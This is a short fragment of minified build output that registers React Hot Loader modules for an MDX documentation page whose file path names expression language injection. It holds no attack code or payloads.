0)&&(b.register(m,"makeShortcode","/home/runner/work/WgpsecWiki/WgpsecWiki/docs/knowledge/web/expression-language-injection.md"),b.register(N,"layoutProps","/home/runner/work/WgpsecWiki/WgpsecWiki/docs/knowledge/web/expression-language-injection.md"),b.register(l,"MDXLayout","/home/runner/work/WgpsecWiki/WgpsecWiki/docs/knowledge/web/expression-language-injection.md"),b.register(u,"MDXContent","/home/runner/work/WgpsecWiki/WgpsecWiki/docs/knowledge/web/expression-language-injection.md")),(r="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.leaveModule:void 0)&&r(e)}.call(this,t(23)(e))}}]);